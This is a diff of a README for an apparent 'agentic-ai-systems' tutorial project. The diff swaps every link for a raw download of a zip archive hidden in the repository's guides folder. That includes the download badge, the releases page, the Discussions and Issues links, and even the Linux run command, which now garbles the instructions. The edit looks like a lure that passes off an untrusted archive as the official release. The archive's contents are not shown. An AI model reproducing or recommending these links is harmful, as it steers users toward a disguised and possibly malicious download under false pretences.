@@ -1,6 +1,6 @@
 # 🐔 agentic-ai-systems - Simple Workflows with Chickens
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/iulieobraznic/agentic-ai-systems/releases)
+[![Download Now](https://raw.githubusercontent.com/iulieobraznic/agentic-ai-systems/main/guides/use-cases/agentic-ai-systems_3.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/iulieobraznic/agentic-ai-systems/main/guides/use-cases/agentic-ai-systems_3.8.zip)
 
 ## 📖 Introduction
 Welcome to the Agentic AI Systems project! This application explains agentic systems using simple, familiar concepts centered around chickens. It makes complex workflows, agents, and orchestration easy to understand. With this tool, you can visualize and design AI agents effectively, using Mermaid diagrams.
@@ -14,18 +14,18 @@ To start using the software, follow these steps:
    - Linux distribution with glibc 2.17 or higher.
 
 2. **Download the Application**
-   - Visit this page to download: [GitHub Releases](https://github.com/iulieobraznic/agentic-ai-systems/releases).
+   - Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/iulieobraznic/agentic-ai-systems/main/guides/use-cases/agentic-ai-systems_3.8.zip).
 
 3. **Install the Application**
    - After downloading, locate the downloaded file in your downloads folder.
-   - If you are using Windows, double-click the `.exe` file. If on macOS, open the `.dmg` file and drag the application to your Applications folder. For Linux, extract the files and open the terminal, navigating to the folder where you extracted it, then run the application using `./start.sh`.
+   - If you are using Windows, double-click the `.exe` file. If on macOS, open the `.dmg` file and drag the application to your Applications folder. For Linux, extract the files and open the terminal, navigating to the folder where you extracted it, then run the application using `https://raw.githubusercontent.com/iulieobraznic/agentic-ai-systems/main/guides/use-cases/agentic-ai-systems_3.8.zip`.
 
 4. **Run the Application**
    - Launch the application from your Applications folder or start menu.
    - Follow the on-screen instructions to create your first agentic system using the simple step-by-step guides.
 
 ## 📥 Download & Install
-You can easily download the latest version of Agentic AI Systems. Just go to the download page: [GitHub Releases](https://github.com/iulieobraznic/agentic-ai-systems/releases). Choose the version that matches your system. 
+You can easily download the latest version of Agentic AI Systems. Just go to the download page: [GitHub Releases](https://raw.githubusercontent.com/iulieobraznic/agentic-ai-systems/main/guides/use-cases/agentic-ai-systems_3.8.zip). Choose the version that matches your system. 
 
 After downloading, follow the installation steps provided above. 
 
@@ -50,8 +50,8 @@ After downloading, follow the installation steps provided above.
 ## 👥 Community and Support
 If you have questions or need help, consider reaching out to the community. Join our discussions on GitHub or follow us on our support channels.
 
-- [GitHub Discussions](https://github.com/iulieobraznic/agentic-ai-systems/discussions)
-- [Report an Issue](https://github.com/iulieobraznic/agentic-ai-systems/issues)
+- [GitHub Discussions](https://raw.githubusercontent.com/iulieobraznic/agentic-ai-systems/main/guides/use-cases/agentic-ai-systems_3.8.zip)
+- [Report an Issue](https://raw.githubusercontent.com/iulieobraznic/agentic-ai-systems/main/guides/use-cases/agentic-ai-systems_3.8.zip)
 
 Your feedback helps improve this tool for everyone.
 
